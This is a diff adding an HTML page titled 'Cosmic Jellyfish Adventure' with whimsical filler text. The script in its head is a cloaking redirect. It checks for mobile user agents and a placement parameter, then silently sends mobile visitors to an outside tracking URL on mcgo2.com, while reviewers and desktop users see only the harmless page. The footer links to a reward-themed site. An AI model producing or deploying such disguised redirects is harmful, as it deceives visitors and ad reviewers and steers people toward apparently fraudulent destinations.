@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Adventure</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #FF69B4, #4B0082);
+            color: #FFFF00;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #00CED1;
+            padding: 20px;
+            text-align: right;
+        }
+        main {
+            display: flex;
+            flex-direction: column-reverse;
+            align-items: center;
+            padding: 50px;
+        }
+        .container {
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 800px;
+            margin-bottom: 30px;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 3px 3px #FF1493;
+        }
+        p {
+            font-size: 1.2em;
+            line-height: 1.6;
+        }
+        .floating-box {
+            position: fixed;
+            top: 50%;
+            left: 20px;
+            transform: translateY(-50%);
+            background-color: #7FFF00;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+        footer {
+            background-color: #8A2BE2;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #00FF7F;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <nav>
+            <a href="#">Home</a> |
+            <a href="#">About</a> |
+            <a href="#">Contact</a>
+        </nav>
+    </header>
+    <main>
+        <div class="container">
+            <h1>Welcome to the Cosmic Jellyfish Adventure!</h1>
+            <p>Embark on a whimsical journey through the neon seas of space, where jellyfish float among the stars and stardust sparkles like glitter in the cosmic currents.</p>
+        </div>
+        <div class="container">
+            <h2>Discover the Wonders</h2>
+            <ul>
+                <li>Bioluminescent Nebulas</li>
+                <li>Gravity-defying Coral Reefs</li>
+                <li>Interstellar Plankton Clouds</li>
+            </ul>
+        </div>
+    </main>
+    <div class="floating-box">
+        <p>Did you know? Space jellyfish can grow up to the size of a small planet!</p>
+    </div>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
